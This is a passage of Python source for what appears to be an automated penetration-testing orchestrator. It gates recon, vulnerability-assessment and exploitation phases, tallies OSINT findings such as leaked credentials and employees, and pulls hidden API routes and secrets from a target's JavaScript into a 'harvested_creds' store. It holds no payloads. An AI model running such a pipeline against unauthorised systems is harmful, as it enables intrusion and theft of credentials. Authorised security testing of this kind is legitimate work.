                    f"failed={failed_count}, blocked={blocked_count}")
        
        # Check for blocking issues
        if blocked_count > 0 and running_count == 0 and completed_count == 0:
            return BrainDecision(
                action=BrainDecisionAction.BLOCKED,
                reason="Tasks blocked and no progress being made"
            )
        
        # Phase-based decision
        phase = self._determine_phase(state)
        
        if phase == "recon":
            return self.plan_reconnaissance(state)
        elif phase == "analysis":
            return self.plan_analysis(state)
        else:
            return BrainDecision(
                action=BrainDecisionAction.COMPLETE,
                reason="No more phases to execute"
            )

    def plan_analysis(self, state: ExecutionState) -> BrainDecision:
        # This would implement deeper analysis logic
        return BrainDecision(
            action=BrainDecisionAction.COMPLETE,
            reason="Analysis planning not yet implemented"
        )

    def _determine_phase(self, state: ExecutionState) -> str:
        hosts_known = len(self.knowledge_store.get_by_type("host"))
        ports_known = len(self.knowledge_store.get_by_type("port"))
        services_known = len(self.knowledge_store.get_by_type("service"))
        
        if hosts_known == 0:
            return "recon"
        elif ports_known == 0:
            return "recon"
        elif services_known == 0:
            return "recon"
        else:
            return "analysis"

    def get_execution_state(self) -> ExecutionState:
        # Separate tasks by status
        all_tasks = self.task_manager.get_all_tasks()
        completed = [t.spec for t in all_tasks if t.status.value == "COMPLETED"]
        running = [t.spec for t in all_tasks if t.status.value == "RUNNING"]
        failed = [t.spec.task_id for t in all_tasks if t.status.value == "FAILED"]
        blocked = [t.spec.task_id for t in all_tasks if t.status.value == "BLOCKED"]
        
        return ExecutionState(
            target=self.target,
            scope=self.scope,
            tasks_completed=completed,
            tasks_running=running,
            tasks_failed=failed,
            tasks_blocked=blocked,
            task_dependency_graph=self.task_manager.get_dependency_graph(),
            knowledge_summary=self.knowledge_store.summarize(),
            evidence_summary=self.evidence_store.to_dict(),
            findings=self.finding_store.get_all(),
            available_capabilities=[
                CapabilityType.DNS_ENUMERATION,
                CapabilityType.PORT_SCANNING,
                CapabilityType.TLS_ANALYSIS,
                CapabilityType.TECHNOLOGY_FINGERPRINTING,
                CapabilityType.HTTP_ANALYSIS,
            ],
            objectives=self.scope.get("objectives", []),
        )

    def to_dict(self) -> Dict:
        return {
            "execution_count": self.execution_count,
            "target": self.target,
            "scope": self.scope,
            "knowledge": self.knowledge_store.to_dict(),
            "evidence": self.evidence_store.to_dict(),
            "findings": self.finding_store.to_dict(),
            "tasks": self.task_manager.to_dict(),
            "start_time": self.start_time.isoformat(),
        }

    def _get_db_execution_context(self) -> Dict[str, Any]:
        completed_tasks = []
        for task in self.task_manager.get_all_tasks():
            if task.status.value in ("COMPLETED", "FAILED", "RUNNING"):
                target = task.spec.inputs.get("target") or task.spec.inputs.get("url") or task.spec.inputs.get("domain") or self.target
                tools = task.spec.inputs.get("tools", [])
                summary_finding = ""
                if task.result and isinstance(task.result, dict):
                    summary_finding = str(task.result.get("results") or task.result.get("reason") or "")[:150]
                completed_tasks.append([
                    task.spec.capability.value,
                    target,
                    ",".join(tools) if tools else "default",
                    task.status.value,
                    summary_finding
                ])

        # Pull discovered assets from persistent knowledge store or shared context
        subdomains = list(getattr(self.ctx, "subdomains", []))
        ips = list(getattr(self.ctx, "ips", []))
        ports = dict(getattr(self.ctx, "ports", {}))
        technologies = dict(getattr(self.ctx, "technologies", {}))

        return {
            "completed_tasks": completed_tasks[-10:],
            "discovered_assets": {
                "subdomains": subdomains[:10],
                "ips": ips[:10],
                "open_ports": ports,
                "technologies": technologies
            }
        }

    def _is_recon_complete(self, db_context: Dict[str, Any]) -> bool:
        return self._evaluate_phase_gate("recon", db_context)

    def _evaluate_phase_gate(self, phase: str, db_context: Dict[str, Any]) -> bool:
        completed = db_context.get("completed_tasks", [])
        p_lower = phase.lower().strip()

        # 1. Reconnaissance Phase Gate (recon, osint, deep_recon)
        if p_lower in ("recon", "osint_reconnaissance", "deep_reconnaissance"):
            if not completed:
                return False
            recon_caps = {"dns_enumeration", "port_scanning", "technology_fingerprinting", "tls_analysis", "subdomain_enumeration", "endpoint_discovery"}
            executed_recon = {f"{item[0]}:{item[1]}" for item in completed if item[0] in recon_caps}
            subdomains = db_context.get("discovered_assets", {}).get("subdomains", [])
            targets = set([self.target] + subdomains[:5])
            required_port_scans = {f"port_scanning:{t}" for t in targets}
            if required_port_scans.issubset(executed_recon) or len(executed_recon) >= 3:
                return True
            return False

        # 2. Vulnerability Assessment Phase Gate (analyze)
        elif p_lower in ("analyze", "vulnerability_assessment"):
            vuln_caps = {"vulnerability_scanning", "http_analysis", "javascript_analysis"}
            executed_vulns = [item for item in completed if item[0] in vuln_caps]
            if getattr(self.ctx, "vulnerabilities", []) or len(executed_vulns) >= 2:
                return True
            return False

        # 3. Exploitation Phase Gate (exploit)
        elif p_lower in ("exploit", "exploitation"):
            vulns = getattr(self.ctx, "vulnerabilities", [])
            if not vulns:
                return True
            exploit_results = getattr(self.ctx, "exploit_results", [])
            if len(exploit_results) >= len(vulns) or len(exploit_results) >= 3:
                return True
            return False

        return False

    def _aggregate_wave_results(self, agents: List[Any], results: List[Any]) -> None:
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                continue
            
            res_data = result if isinstance(result, dict) else {}
            
            # 1. Aggregate discovered ports
            discovered_ports = res_data.get("open_ports") or res_data.get("ports") or []
            if isinstance(discovered_ports, list):
                for port in discovered_ports:
                    if isinstance(port, (int, str)):
                        self.ctx.ports[str(port)] = "open"
                    elif isinstance(port, dict):
                        p_num = str(port.get("port", ""))
                        if p_num:
                            self.ctx.ports[p_num] = port.get("service", "open")

            # 2. Aggregate discovered endpoints
            endpoints = res_data.get("endpoints") or res_data.get("discovered_endpoints") or []
            if isinstance(endpoints, list):
                for ep in endpoints:
                    if isinstance(ep, str) and ep not in self.ctx.endpoints:
                        self.ctx.endpoints.append(ep)

            # 3. Aggregate discovered subdomains
            subdomains = res_data.get("subdomains") or []
            if isinstance(subdomains, list):
                for sub in subdomains:
                    if isinstance(sub, str) and sub not in self.ctx.subdomains:
                        self.ctx.subdomains.append(sub)

            # 4. Aggregate technologies
            techs = res_data.get("technologies") or res_data.get("tech") or res_data.get("tech_stack") or {}
            target_host = self.ctx.target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
            if isinstance(techs, dict):
                for k, v in techs.items():
                    if isinstance(v, list):
                        self.ctx.add_technologies(k, v)
                    else:
                        self.ctx.add_technologies(target_host, [f"{k}:{v}" if v != "detected" else k])
            elif isinstance(techs, list) and techs:
                self.ctx.add_technologies(target_host, techs)

            # 5. Persist to KnowledgeStore if available
            if hasattr(self, "store") and self.store:
                try:
                    for port, service in self.ctx.ports.items():
                        self.store.add_asset(
                            asset_type="port",
                            value=f"{self.ctx.target}:{port}",
                            metadata={"service": service}
                        )
                    for ep in self.ctx.endpoints:
                        self.store.add_endpoint(
                            target_id=self.ctx.target,
                            url=ep,
                            method="GET"
                        )
                except Exception as e:
                    logger.warning(f"Failed to persist wave aggregation to knowledge store: {e}")

            try:
                self._write_live_results()
            except Exception:
                pass

    async def _run_phase_osint_reconnaissance(self):
        logger.info("\n>>> PHASE 0: OSINT RECONNAISSANCE")
        logger.info("=" * 60)
        
        try:
            # Extract target info
            target_domain = self.ctx.target.replace('https://', '').replace('http://', '').split('/')[0]
            company_name = self._extract_company_name(target_domain)
            
            logger.info(f"Target Domain: {target_domain}")
            logger.info(f"Company Name: {company_name}")
            
            # Run OSINT reconnaissance
            osint_results = await self.osint_orchestrator.run_phase_osint_reconnaissance(
                domain=target_domain,
                company_name=company_name
            )
            
            # Store results
            self.ctx.update('osint_findings', osint_results)
            
            # Generate summary
            summary = self.osint_orchestrator.generate_osint_summary_report()
            logger.info(f"OSINT Summary:\n{json.dumps(summary, indent=2)}")
            
            logger.info(">>> OSINT Reconnaissance Complete")
            logger.info("=" * 60)

            # Persist OSINT into live_results + recon_data so the UI sees it
            # immediately without waiting for the next phase's heartbeat.
            try:
                self._write_live_results()
            except Exception as _e:
                logger.warning(f"[OSINT] live-results flush failed (non-fatal): {_e}")
            try:
                self._persist_recon_data()
            except Exception as _e:
                logger.warning(f"[OSINT] recon_data persist failed (non-fatal): {_e}")

        except Exception as e:
            logger.error(f"OSINT Reconnaissance failed: {e}")
            self.ctx.update('osint_failed', True)

    def _extract_company_name(self, domain: str) -> str:
        # Remove TLD
        parts = domain.split('.')
        if len(parts) > 1:
            return parts[0]
        return domain
    
    async def _run_phase_deep_reconnaissance(self):
        emp_count = len(getattr(self.ctx, "discovered_employees", []) or self.ctx.get("discovered_employees", []) or [])
        cred_count = len(getattr(self.ctx, "leaked_credentials", []) or self.ctx.get("leaked_credentials", []) or [])
        sub_count = len(getattr(self.ctx, "discovered_subdomains", []) or self.ctx.get("discovered_subdomains", []) or [])
        bucket_count = len(getattr(self.ctx, "cloud_buckets", []) or self.ctx.get("cloud_buckets", []) or [])
        threat_count = len(getattr(self.ctx, "threat_correlations", []) or self.ctx.get("threat_correlations", []) or [])
        
        # Update brain prompt
        osint_context = f"""
        OSINT RECONNAISSANCE COMPLETE:
        - Discovered Employees: {emp_count}
        - Leaked Credentials: {cred_count}
        - Subdomains Found: {sub_count}
        - Cloud Buckets: {bucket_count}
        - Threat Correlations: {threat_count}
        
        Use these findings to prioritize scanning targets.
        Focus on discovered subdomains and hosts found in threat feeds.
        """
        
        # Include in next phase planning log
        logger.info(f"OSINT context generated for DEEP_RECONNAISSANCE: {osint_context.strip()}")


    async def _analyze_client_scripts(self):
        target = self.ctx.target
        if not str(target).lower().startswith(("http://", "https://")):
            return

        logger.info("\n>>> PHASE 1c: JAVASCRIPT API & PARAMETER RECONSTRUCTION")
        try:
            html = getattr(self.ctx, "page_content", "") or ""
            if not html:
                try:
                    import httpx
                    async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as client:
                        r = await client.get(target)
                        html = r.text
                except Exception:
                    html = ""

            results = await APIReconstructor.extract_from_target(target, html_content=html)
            new_endpoints = results.get("endpoints", [])
            new_params = results.get("parameters", [])
            new_secrets = results.get("secrets", [])

            if new_endpoints:
                for ep in new_endpoints:
                    eid = ep if isinstance(ep, str) else getattr(ep, 'endpoint_id', str(ep))
                    if eid not in self.ctx.endpoints:
                        self.ctx.endpoints[eid] = ep
                logger.info(f"[JS_Reconstructor] Discovered {len(new_endpoints)} hidden API routes from JS bundles")

            if new_params:
                existing_params = getattr(self.ctx, "parameters", []) or []
                if isinstance(existing_params, dict):
                    existing_params = list(existing_params.values())
                for p in new_params:
                    if p not in existing_params:
                        existing_params.append(p)
                self.ctx.update("parameters", existing_params)

            if new_secrets:
                creds = getattr(self.ctx, "harvested_creds", []) or []
                creds.extend(new_secrets)
                self.ctx.update("harvested_creds", creds)
                logger.info(f"[JS_Reconstructor] Extracted {len(new_secrets)} potential tokens/secrets from JS bundles")

            # Update TargetProfile with newly discovered endpoints
            if self.target_profile:
                self.target_profile.endpoints = list(self.ctx.endpoints.values())
                self.ctx.update("target_profile", self.target_profile.to_dict())

        except Exception as e:
            logger.warning(f"[JS_Reconstructor] Script analysis failed (non-fatal): {e}")
